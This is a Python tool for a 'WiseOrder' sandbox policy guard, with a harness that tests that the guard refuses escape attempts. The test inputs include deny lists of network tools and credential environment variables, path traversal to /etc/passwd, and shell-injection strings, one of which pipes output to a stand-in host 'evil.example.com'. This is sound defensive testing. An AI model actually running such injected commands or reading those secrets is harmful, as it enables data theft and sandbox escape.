#!/usr/bin/env python3
"""WiseOrder Protocol v0.1.0 — Sandbox Escape Check.

A self-contained policy guard plus an attack harness. The guard accepts
candidate operations (paths, commands, env-var reads, output sizes) and
returns ALLOW or DENY. The harness constructs adversarial inputs across six
categories and asserts the guard DENIES each:

  1. symlink breakout
  2. path traversal
  3. forbidden env access
  4. forbidden network command
  5. recursive subprocess attempt
  6. output flood

This tool does NOT execute any of the hostile commands. It only verifies
that the policy guard recognizes and refuses each pattern. The point is to
make the refusal logic itself testable independent of an OS sandbox.

Usage:
  python3 tools/sandbox_escape_check.py [--quiet]
  python3 tools/sandbox_escape_check.py self-check

Exit codes:
  0   every escape attempt was refused (guard correct)
  1   one or more attempts were allowed (guard non-conformant)
  2   usage / I/O error
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parent.parent

DEFAULT_FORBIDDEN_ENV_PREFIXES = frozenset({
    "AWS_", "AZURE_", "GCP_", "GOOGLE_",
    "SECRET_", "TOKEN_", "PRIVATE_KEY_",
    "GITHUB_TOKEN", "GH_TOKEN", "NPM_TOKEN",
    "SSH_AUTH_SOCK", "ANTHROPIC_API_KEY", "OPENAI_API_KEY",
})

DEFAULT_FORBIDDEN_NETWORK = frozenset({
    "curl", "wget", "ssh", "scp", "sftp", "ftp",
    "nc", "ncat", "telnet", "rsync",
})

DEFAULT_FORBIDDEN_SUBPROCESS = frozenset({
    "python", "python2", "python3", "bash", "sh", "zsh", "fish", "dash",
    "ruby", "perl", "node", "deno", "lua", "tclsh",
    "make", "gcc", "g++", "clang", "cargo",
})

DEFAULT_ALLOWED_COMMANDS = frozenset({"echo", "pwd", "ls", "cat", "true", "false"})

DEFAULT_MAX_OUTPUT_BYTES = 1 * 1024 * 1024  # 1 MiB


@dataclass
class PolicyDecision:
    allowed: bool
    reason: str

    def to_dict(self) -> dict[str, Any]:
        return {"allowed": self.allowed, "reason": self.reason}


class SandboxPolicy:
    """In-process policy guard. Pure logic; performs no I/O of its own."""

    def __init__(
        self,
        sandbox_root: Path,
        allowed_commands: frozenset[str] = DEFAULT_ALLOWED_COMMANDS,
        forbidden_env_prefixes: frozenset[str] = DEFAULT_FORBIDDEN_ENV_PREFIXES,
        forbidden_network: frozenset[str] = DEFAULT_FORBIDDEN_NETWORK,
        forbidden_subprocess: frozenset[str] = DEFAULT_FORBIDDEN_SUBPROCESS,
        max_output_bytes: int = DEFAULT_MAX_OUTPUT_BYTES,
    ) -> None:
        self.sandbox_root = sandbox_root.resolve(strict=False)
        self.allowed_commands = allowed_commands
        self.forbidden_env_prefixes = forbidden_env_prefixes
        self.forbidden_network = forbidden_network
        self.forbidden_subprocess = forbidden_subprocess
        self.max_output_bytes = int(max_output_bytes)

    def check_path(self, path: Path) -> PolicyDecision:
        if any(part == ".." for part in path.parts):
            return PolicyDecision(False, "path contains traversal segment '..'")
        try:
            real = path.resolve(strict=False)
        except (RuntimeError, OSError) as exc:
            return PolicyDecision(False, f"path resolution error: {exc}")
        try:
            real.relative_to(self.sandbox_root)
        except ValueError:
            return PolicyDecision(False, f"resolved path escapes sandbox root: {real}")
        return PolicyDecision(True, "path within sandbox")

    def check_command(self, argv: list[str]) -> PolicyDecision:
        if not argv:
            return PolicyDecision(False, "empty command")
        head = Path(argv[0]).name.lower()
        if head in self.forbidden_network:
            return PolicyDecision(False, f"forbidden network command: {head}")
        if head in self.forbidden_subprocess:
            return PolicyDecision(False, f"forbidden subprocess invocation: {head}")
        if head not in self.allowed_commands:
            return PolicyDecision(False, f"command not in allowlist: {head}")
        # Reject obvious injection patterns even for allowed commands.
        for tok in argv[1:]:
            if any(c in tok for c in (";", "|", "&", "`", "$(")):
                return PolicyDecision(False, f"shell metacharacter in argument: {tok!r}")
        return PolicyDecision(True, "command allowed")

    def check_env_access(self, var: str) -> PolicyDecision:
        upper = var.upper()
        for pref in self.forbidden_env_prefixes:
            if upper == pref or upper.startswith(pref):
                return PolicyDecision(False, f"forbidden env prefix matched: {pref}")
        return PolicyDecision(True, "env access allowed")

    def check_output_size(self, n: int) -> PolicyDecision:
        if n > self.max_output_bytes:
            return PolicyDecision(
                False,
                f"output {n} bytes exceeds cap {self.max_output_bytes}",
            )
        return PolicyDecision(True, "output within cap")


@dataclass
class AttemptResult:
    category: str
    name: str
    description: str
    refused: bool
    reason: str

    def to_dict(self) -> dict[str, Any]:
        return {
            "category": self.category,
            "name": self.name,
            "description": self.description,
            "refused": self.refused,
            "reason": self.reason,
        }


def run_escape_attempts() -> list[AttemptResult]:
    """Run every escape attempt against a fresh policy. Returns one result per attempt."""
    results: list[AttemptResult] = []
    with tempfile.TemporaryDirectory(prefix="wo-sandbox-") as tmpd:
        wd = Path(tmpd)
        sandbox_root = wd / "sandbox"
        outside = wd / "outside"
        sandbox_root.mkdir(parents=True)
        outside.mkdir(parents=True)
        secret = outside / "classified.txt"
        secret.write_text("CLASSIFIED", encoding="utf-8")

        # Create a symlink inside the sandbox pointing outside it.
        link = sandbox_root / "escape_link"
        try:
            link.symlink_to(secret)
            symlink_supported = True
        except (OSError, NotImplementedError):
            symlink_supported = False

        policy = SandboxPolicy(sandbox_root)

        # 1. symlink breakout
        if symlink_supported:
            d = policy.check_path(link)
            results.append(AttemptResult(
                category="symlink_breakout",
                name="symlink_into_outside",
                description="A symlink inside the sandbox resolves to a file outside the sandbox.",
                refused=not d.allowed,
                reason=d.reason,
            ))
        else:
            results.append(AttemptResult(
                category="symlink_breakout",
                name="symlink_unsupported_skip",
                description="symlink not supported in this environment; skipping",
                refused=True,
                reason="environment does not support symlinks; treated as refused",
            ))

        # 2. path traversal
        for traversal_input in [
            sandbox_root / ".." / "outside" / "classified.txt",
            sandbox_root / ".." / ".." / "etc" / "passwd",
            Path("/etc/passwd"),
        ]:
            d = policy.check_path(traversal_input)
            results.append(AttemptResult(
                category="path_traversal",
                name=f"traversal::{traversal_input}",
                description="Attempt to address a path outside the sandbox by '..' or absolute path.",
                refused=not d.allowed,
                reason=d.reason,
            ))

        # 3. forbidden env access
        for var in ("AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "ANTHROPIC_API_KEY",
                    "SSH_AUTH_SOCK", "OPENAI_API_KEY", "AZURE_CLIENT_SECRET"):
            d = policy.check_env_access(var)
            results.append(AttemptResult(
                category="forbidden_env",
                name=f"env::{var}",
                description=f"Read of environment variable {var}.",
                refused=not d.allowed,
                reason=d.reason,
            ))

        # 4. forbidden network command
        for argv in (
            ["curl", "https://example.com/secret"],
            ["wget", "https://example.com/secret"],
            ["ssh", "user@example.com"],
            ["nc", "example.com", "443"],
            ["/usr/bin/curl", "https://example.com"],
        ):
            d = policy.check_command(argv)
            results.append(AttemptResult(
                category="forbidden_network",
                name=f"net::{argv[0]}",
                description=f"Attempt to invoke network command: {argv}",
                refused=not d.allowed,
                reason=d.reason,
            ))

        # 5. recursive subprocess attempt
        for argv in (
            ["python3", "-c", "import os; os.system('echo pwned')"],
            ["bash", "-c", "echo escape"],
            ["sh", "-c", "echo escape"],
            ["node", "-e", "process.exit(0)"],
        ):
            d = policy.check_command(argv)
            results.append(AttemptResult(
                category="recursive_subprocess",
                name=f"subproc::{argv[0]}",
                description=f"Attempt to spawn an interpreter: {argv}",
                refused=not d.allowed,
                reason=d.reason,
            ))

        # 5b. shell metacharacter in argument to allowed command.
        for argv in (
            ["echo", "hello; cat /etc/passwd"],
            ["echo", "$(whoami)"],
            ["echo", "x | nc evil.example.com 4444"],
        ):
            d = policy.check_command(argv)
            results.append(AttemptResult(
                category="recursive_subprocess",
                name="metachar::" + argv[1][:24],
                description=f"Allowed command with shell injection in argument: {argv}",
                refused=not d.allowed,
                reason=d.reason,
            ))

        # 6. output flood
        for n in (
            policy.max_output_bytes + 1,
            10 * policy.max_output_bytes,
            100 * 1024 * 1024,  # 100 MiB
        ):
            d = policy.check_output_size(n)
            results.append(AttemptResult(
                category="output_flood",
                name=f"flood::{n}",
                description=f"Attempt to emit {n} bytes of output.",
                refused=not d.allowed,
                reason=d.reason,
            ))

        # Negative controls — these MUST be allowed (refused=False).
        ok_results: list[AttemptResult] = []
        d = policy.check_path(sandbox_root / "ok.txt")
        ok_results.append(AttemptResult(
            category="control_allow",
            name="path_inside_sandbox",
            description="A path within sandbox MUST be allowed.",
            refused=not d.allowed,
            reason=d.reason,
        ))
        d = policy.check_command(["echo", "hello"])
        ok_results.append(AttemptResult(
            category="control_allow",
            name="allowed_echo",
            description="echo is in the allowlist; plain argument MUST be allowed.",
            refused=not d.allowed,
            reason=d.reason,
        ))
        d = policy.check_env_access("PATH")
        ok_results.append(AttemptResult(
            category="control_allow",
            name="env_PATH",
            description="PATH is not in the forbidden prefixes; access MUST be allowed.",
            refused=not d.allowed,
            reason=d.reason,
        ))
        d = policy.check_output_size(1024)
        ok_results.append(AttemptResult(
            category="control_allow",
            name="output_within_cap",
            description="1 KiB of output MUST be allowed.",
            refused=not d.allowed,
            reason=d.reason,
        ))
        results.extend(ok_results)

    return results


def all_passed(results: list[AttemptResult]) -> bool:
    """Adversarial attempts MUST be refused; control_allow attempts MUST be allowed."""
    for r in results:
        if r.category == "control_allow":
            if r.refused:
                return False
        else:
            if not r.refused:
                return False
    return True


def _print_table(results: list[AttemptResult]) -> None:
    print("WiseOrder Protocol v0.1.0 — Sandbox Escape Check")
    print("=" * 72)
    width = max((len(r.name) for r in results), default=20)
    by_cat: dict[str, list[AttemptResult]] = {}
    for r in results:
        by_cat.setdefault(r.category, []).append(r)
    for cat, items in by_cat.items():
        print(f"\n[{cat}]")
        for r in items:
            if r.category == "control_allow":
                expected = "ALLOWED"
                got = "ALLOWED" if not r.refused else "REFUSED"
            else:
                expected = "REFUSED"
                got = "REFUSED" if r.refused else "ALLOWED"
            verdict = "PASS" if got == expected else "FAIL"
            print(f"  {verdict} | {r.name:<{width}} | {got}")
            if verdict == "FAIL":
                print(f"         ↳ {r.reason}")
    total = len(results)
    failed = sum(
        1 for r in results
        if (r.category != "control_allow" and not r.refused)
        or (r.category == "control_allow" and r.refused)
    )
    print("\n" + "=" * 72)
    print(f"Summary: {total} attempts, {total - failed} as-expected, {failed} failed")


def self_check() -> int:
    results = run_escape_attempts()
    return 0 if all_passed(results) else 1


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="WiseOrder sandbox escape check")
    sub = parser.add_subparsers(dest="cmd")
    sub.add_parser("self-check")
    check = sub.add_parser("check")
    check.add_argument("--quiet", action="store_true")
    check.add_argument("--json", action="store_true",
                       help="emit machine-readable JSON instead of a table")
    args = parser.parse_args(argv)
    if args.cmd is None:
        args.cmd = "check"
        args.quiet = False
        args.json = False
    if args.cmd == "self-check":
        return self_check()
    results = run_escape_attempts()
    if args.json:
        print(json.dumps({
            "all_passed": all_passed(results),
            "results": [r.to_dict() for r in results],
        }, indent=2, sort_keys=True))
    elif not args.quiet:
        _print_table(results)
    return 0 if all_passed(results) else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
